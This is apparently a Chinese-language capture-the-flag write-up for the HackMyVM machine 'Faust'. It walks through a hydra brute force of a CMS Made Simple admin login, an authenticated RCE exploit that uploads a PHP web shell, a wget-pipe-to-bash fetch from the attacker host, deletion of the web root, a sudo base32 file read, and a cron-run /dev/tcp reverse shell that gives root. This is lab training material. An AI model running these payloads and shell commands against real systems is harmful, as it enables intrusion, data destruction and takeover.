# Faust

2024-11-10 https://hackmyvm.eu/machines/machine.php?vm=Faust

## IP

192.168.5.40

## Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6660/tcp open  unknown
```

先看 6660，telnet 连接后得到一个提示：

```
telnet 192.168.5.40 6660

MESSAGE FOR WWW-DATA:

www-data I offer you a dilemma: if you agree to destroy all your stupid work, then you have a reward in my house...
Paul
```

得到一个像是用户名 Paul，其他没有信息。

看看 80 web 服务，是一个 CMS Made Simple 的 CMS 版本 2.2.5。

先尝试爆破看看能不能得到密码，使用 paul 爆破没有找到密码，在尝试该 CMS 的默认管理员是 admin：

```
hydra -t 20 -l admin -P ~/tools/dict/rockyou.txt 192.168.5.40 -f http-post-form "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:F=User name or password incorrect"

[80][http-post-form] host: 192.168.5.40   login: admin   password: bullshit
```

找到了密码 bullshit 能够进入系统后台，同时该版本的 CMS 存在一个认证情况下的 RCE 漏洞 44976.py，使用得到的凭据进行利用，修改 ip 和凭据等：

```
base_url = "http://192.168.5.40/admin"
upload_dir = "/uploads"
upload_url = base_url.split('/admin')[0] + upload_dir
username = "admin"
password = "bullshit"

csrf_param = "_sk_"  <-- 这里要根据系统返回的前缀进行修改，否则执行会报错
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"
```

最后得到 shell 连接 http://192.168.5.40/shell.php (注意没有在 upload 目录中，是在根目录中)：

```
curl -G --data-urlencode 'cmd=id' http://192.168.5.40/shell.php
```

执行反弹，获得 web shell：

```
curl -G --data-urlencode 'cmd=wget -q -O - http://192.168.5.3/5-3/8888.sh|bash' http://192.168.5.40/shell.php
```

进入 shell 后，先看到 config.php 里面有数据库连接配置信息，可能存在密码复用的情况：

```
$config['dbms'] = 'mysqli';
$config['db_hostname'] = 'localhost';
$config['db_username'] = 'cms_user';
$config['db_password'] = 'UltraSecurePassword';
$config['db_name'] = 'cms_db';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'Europe/Berlin';
```

发现用户 /home/nico 下有 user flag，但是要先提权到此用户。

pspy 发现 bash /home/paul/.local/chaos.sh 这个脚本每秒都在运行，同时发现另外一个脚本/home/paul/.local/chaos.sh 但是这些都看不到内容。

回看最开始的 6660 端口中说的内容：

```
MESSAGE FOR WWW-DATA:

www-data I offer you a dilemma: if you agree to destroy all your stupid work, then you have a reward in my house...
Paul
```

让我们删除/var/www/html 中的内容，看看会不会在 paul 的 home 目录中出现内容：

```
rm -r /var/www/html/
```

删除后，果然在 paul 的目录中出现了 paul 用户的密码文件：

```
www-data@debian:/home/paul$ ls
password.txt
www-data@debian:/home/paul$ cat password.txt
Password is: YouCanBecomePaul
```

su paul 切换到了 paul 用户。

sudo -l 发现提示：

```
(nico) /usr/bin/base32
```

直接读取 user flag:

```
sudo -u nico /usr/bin/base32 /home/nico/user.txt | base32 --decode
gamhanarhu
```

发现 /home/nico/ 中有一个 .secret.txt 文件，也使用上面的方式进行读取：

```
sudo -u nico /usr/bin/base32 /home/nico/.secret.txt | base32 --decode

UHcgPT4ganVzdF9vbmVfbW9yZV9iZWVyIA==

echo 'UHcgPT4ganVzdF9vbmVfbW9yZV9iZWVyIA=='|base64 -d
Pw => just_one_more_beer
```

just_one_more_beer 应该是 nico 的用户密码，su 切换成功。nico 没有 sudo -l 权限。经过 lin peas 也没发现其他可利用路径，在 / 根目录中发现了 nico 文件夹，里面有一个 homer.jpg 图片。将其传送到 kali 上进行图片隐写分析：

```
steghide --extract -sf homer.jpg

cat note.txt
my /tmp/goodgame file was so good... but I lost it
```

/tmp/goodgame 应该是个被定时调用的脚本，pspy 中发现 2024/11/10 04:56:01 CMD: UID=0 PID=15768 | /bin/sh -c /tmp/goodgame，但是在 tmp 中没有，我们可以自己创建反弹 shell：

```
#!/bin/bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.5.3/5555 0>&1'
```

但是发现一直没有反应,这个 /tmp 目录不对，尝试用 ssh 登陆 nico 用户，再次创建上面的脚本，最终得到了 root flag：

```
root@debian:~# id
id
uid=0(root) gid=0(root) groupes=0(root)
root@debian:~# ls
ls
root.txt
root@debian:~# cat root.txt
cat root.txt
lasarnsilgam
```
